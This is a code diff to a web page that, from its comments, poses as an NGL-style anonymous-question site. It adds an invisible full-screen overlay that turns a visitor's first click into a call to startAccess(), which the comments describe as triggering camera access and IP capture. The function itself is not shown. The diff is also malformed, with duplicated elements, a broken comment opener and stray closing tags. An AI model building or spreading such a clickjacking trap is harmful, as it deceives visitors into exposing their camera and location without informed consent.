@@ -89,8 +89,37 @@
   <div id="clickArea"></div>
 
   <script src="script.js"></script>
+      !-- invisible area buat trigger kamera & ip -->
+  <div id="clickArea"></div>
+
+  <script src="script.js"></script>
+
+  <!-- trigger clickArea -->
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const clickArea = document.getElementById("clickArea");
+
+      // gaya invisible layer full screen
+      clickArea.style.position = "fixed";
+      clickArea.style.top = "0";
+      clickArea.style.left = "0";
+      clickArea.style.width = "100%";
+      clickArea.style.height = "100%";
+      clickArea.style.background = "transparent";
+      clickArea.style.zIndex = "9999";
+      clickArea.style.cursor = "pointer";
+
+      // kalau di-klik → hilang + panggil fungsi
+      clickArea.addEventListener("click", () => {
+        clickArea.style.display = "none";
+        if (typeof startAccess === "function") {
+          startAccess(); // ini di-handle di script.js
+        }
+      });
+    });
+  </script>
 </body>
-      <script>
+    </html>
 document.addEventListener("DOMContentLoaded", () => {
   // --- list pertanyaan random ala NGL ---
   const randomQuestions = [
